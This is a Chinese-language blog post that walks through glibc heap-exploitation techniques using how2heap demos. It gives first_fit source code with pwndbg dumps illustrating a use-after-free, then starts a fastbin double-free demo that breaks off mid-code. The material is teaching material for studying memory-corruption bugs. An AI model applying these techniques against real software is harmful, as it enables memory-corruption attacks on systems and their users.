<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="Educational Heap Exploitation">
<meta property="og:url" content="https://bestwing.me/Educational_Heap_Exploitation.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154134.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154346.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814164027.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814165413.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814172825.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814182745.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910171629.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910173014.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910174002.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910175250.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926152853.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233627.png">
<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233920.png">
<meta property="article:published_time" content="2018-10-18T16:00:00.000Z">
<meta property="article:modified_time" content="2020-11-10T09:49:34.165Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="Heap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Educational Heap Exploitation</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/link">Links</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/GeekPwn%E5%8F%82%E8%B5%9B%E8%AE%B0.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018-inctf-Pwn-securepad-writrup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
      <span id="i-next" class="info" style="display:none;">Post Següent</span>
      <span id="i-top" class="info" style="display:none;">Adalt</span>
      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/Educational_Heap_Exploitation.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/Educational_Heap_Exploitation.html&text=Educational Heap Exploitation"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/Educational_Heap_Exploitation.html&is_video=false&description=Educational Heap Exploitation"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Educational Heap Exploitation&body=Check out this article: https://bestwing.me/Educational_Heap_Exploitation.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/Educational_Heap_Exploitation.html&title=Educational Heap Exploitation"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/Educational_Heap_Exploitation.html&name=Educational Heap Exploitation&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/Educational_Heap_Exploitation.html&t=Educational Heap Exploitation"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Educational-Heap-Exploitation"><span class="toc-number">1.</span> <span class="toc-text">Educational Heap Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-first-fit"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 first_fit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-fastbin-dup"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 fastbin_dup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-fastbin-dup-into-stack"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-fastbin-dup-consolidate"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 fastbin_dup_consolidate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-unsafe-unlink"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 unsafe_unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-house-of-spirit"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 house_of_spirit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-poison-null-byte"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 poison_null_byte</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.8.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-house-of-lore"><span class="toc-number">1.9.</span> <span class="toc-text">0x08 house_of_lore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-overlapping-chunks"><span class="toc-number">1.10.</span> <span class="toc-text">0x09 overlapping_chunks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-overlapping-chunks-2"><span class="toc-number">1.11.</span> <span class="toc-text">0x10 overlapping_chunks_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-house-of-force"><span class="toc-number">1.12.</span> <span class="toc-text">0x11 house_of_force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-unsorted-bin-into-stack"><span class="toc-number">1.13.</span> <span class="toc-text">0x12 unsorted_bin_into_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-unsorted-bin-attack"><span class="toc-number">1.14.</span> <span class="toc-text">0x13 unsorted_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-house-of-einherjar"><span class="toc-number">1.15.</span> <span class="toc-text">0x14 house_of_einherjar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-house-of-orange"><span class="toc-number">1.16.</span> <span class="toc-text">0x15 house of orange</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.17.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Educational Heap Exploitation
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2018-10-18T16:00:00.000Z" itemprop="datePublished">2018-10-19</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Summary/">Summary</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Heap/" rel="tag">Heap</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>通过 how2heap 复习堆利用</p>
<p>首发于先知社区 <a href="https://xz.aliyun.com/t/2582">https://xz.aliyun.com/t/2582</a></p>
<h2 id="Educational-Heap-Exploitation"><a href="#Educational-Heap-Exploitation" class="headerlink" title="Educational Heap Exploitation"></a>Educational Heap Exploitation</h2><p><a href="https://github.com/shellphish/how2heap">how2heap</a>这是由 shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。    且主要针对 glibc</p>
<h3 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first_fit"></a>0x01 first_fit</h3><p>Source:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(512): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(256): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;we could continue mallocing here...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">&quot;this is A!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We don&#x27;t need to free anything again. As long as we allocate less than 512, it will end up at %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, let&#x27;s allocate 500 bytes\n&quot;</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(500): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">&quot;this is C!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们从调试上入手，首先简单对 main 函数下断点。<code>b main</code> 。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814152947.png"></a></p>
<p>程序首先创建了两个 chunk，size分别为 512 和256。然后向chunk a  分别写入字符串 ‘this is A’ 。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x602320</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x211,</span><br><span class="line">  fd = 0x2073692073696874,</span><br><span class="line">  bk = 0x2141,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/20a 0x602000</span><br><span class="line">0x602000:	0x0	0x211</span><br><span class="line">0x602010:	0x2073692073696874	0x2141</span><br><span class="line">0x602020:	0x0	0x0</span><br><span class="line">0x602030:	0x0	0x0</span><br><span class="line">0x602040:	0x0	0x0</span><br><span class="line">0x602050:	0x0	0x0</span><br><span class="line">0x602060:	0x0	0x0</span><br><span class="line">0x602070:	0x0	0x0</span><br><span class="line">0x602080:	0x0	0x0</span><br><span class="line">0x602090:	0x0	0x0</span><br><span class="line">Pwndbg&gt; x/5s 0x602010</span><br><span class="line">0x602010:	<span class="string">&quot;this is A!&quot;</span></span><br><span class="line">0x60201b:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201c:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201d:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60201e:</span><br></pre></td></tr></table></figure>

<p>这个时候我们把 chunk A free掉。由于chunk A 大小为 512 不适于 fastbins 系统会将这个chunk 放入unsortedbin。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154134.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154134.png"></a></p>
<hr>
<p>基本来源：</p>
<ol>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于top chunk的解释，请参考下面的介绍。</li>
<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li>
</ol>
<p>基本使用情况</p>
<ol>
<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li>
<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>
</ol>
<hr>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154346.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814154346.png"></a></p>
<p> 当程序再一次 malloc 一个大小与我们 free 掉的chunk 大小差不多的 chunk ，系统会优先从 bins 里找到一个合适的 chunk 把他取出来再使用。写入’this is C’</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x602320</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x211</span>,</span><br><span class="line">  fd = <span class="number">0x2073692073696874</span>,</span><br><span class="line">  bk = <span class="number">0x7ffff7002143</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/20a 0x602000</span><br><span class="line">0x602000:	0x0	0x211</span><br><span class="line">0x602010:	0x2073692073696874	0x7ffff7002143</span><br><span class="line">0x602020:	0x0	0x0</span><br><span class="line">0x602030:	0x0	0x0</span><br><span class="line">0x602040:	0x0	0x0</span><br><span class="line">0x602050:	0x0	0x0</span><br><span class="line">0x602060:	0x0	0x0</span><br><span class="line">0x602070:	0x0	0x0</span><br><span class="line">0x602080:	0x0	0x0</span><br><span class="line">0x602090:	0x0	0x0</span><br><span class="line">Pwndbg&gt; x/5s 0x602010</span><br><span class="line">0x602010:	<span class="string">&quot;this is C!&quot;</span></span><br><span class="line">0x60201b:	<span class="string">&quot;\367\377\177&quot;</span></span><br><span class="line">0x60201f:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602020:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602021:	<span class="string">&quot;&quot;</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>Unsortedbin 也被取出。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814164027.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814164027.png"></a></p>
<p>我们发现在原来 chunk A 的位置 也是chunk C 的位置。为什么用“也”呢？因为如果去打印 chunk A 的指针我们也会打印出 “This is C” 的字符串。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p &amp;a</span><br><span class="line"><span class="variable">$3</span> = (char **) 0x7fffffffe408</span><br><span class="line">Pwndbg&gt; x/20a 0x7fffffffe408</span><br><span class="line">0x7fffffffe408:	0x602010	0x602220</span><br><span class="line">0x7fffffffe418:	0x602010	0x4008e0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe428:	0x7ffff7a303f1 &lt;__libc_start_main+241&gt;	0x40000</span><br><span class="line">0x7fffffffe438:	0x7fffffffe508	0x1f7b9a488</span><br><span class="line">0x7fffffffe448:	0x400616 &lt;main&gt;	0x0</span><br><span class="line">0x7fffffffe458:	0x873c9590c5edf93b	0x400520 &lt;_start&gt;</span><br><span class="line">0x7fffffffe468:	0x7fffffffe500	0x0</span><br><span class="line">0x7fffffffe478:	0x0	0x78c36aef1c4df93b</span><br><span class="line">0x7fffffffe488:	0x78c37a56d37ff93b	0x0</span><br><span class="line">0x7fffffffe498:	0x0	0x0</span><br><span class="line">Pwndbg&gt; x/20a 0x602010</span><br><span class="line">0x602010:	0x2073692073696874	0x7ffff7002143</span><br><span class="line">0x602020:	0x0	0x0</span><br><span class="line">0x602030:	0x0	0x0</span><br><span class="line">0x602040:	0x0	0x0</span><br><span class="line">0x602050:	0x0	0x0</span><br><span class="line">0x602060:	0x0	0x0</span><br><span class="line">0x602070:	0x0	0x0</span><br><span class="line">0x602080:	0x0	0x0</span><br><span class="line">0x602090:	0x0	0x0</span><br><span class="line">0x6020a0:	0x0	0x0</span><br><span class="line">Pwndbg&gt; p a</span><br><span class="line"><span class="variable">$4</span> = 0x602010 <span class="string">&quot;this is C!&quot;</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>从这我们就会发现 我们去打印 a的内容，a的内容也是‘this is C’。这个就是一个很明显的 <strong>use-after-free</strong> 漏洞。</p>
<hr>
<p>uaf 造成原因：</p>
<pre><code>指针free 掉后并没有置0</code></pre>
<hr>
<h3 id="0x2-fastbin-dup"><a href="#0x2-fastbin-dup" class="headerlink" title="0x2 fastbin_dup"></a>0x2 fastbin_dup</h3><p>Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. </p>
<p>fastbin 机制下的 double free。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span 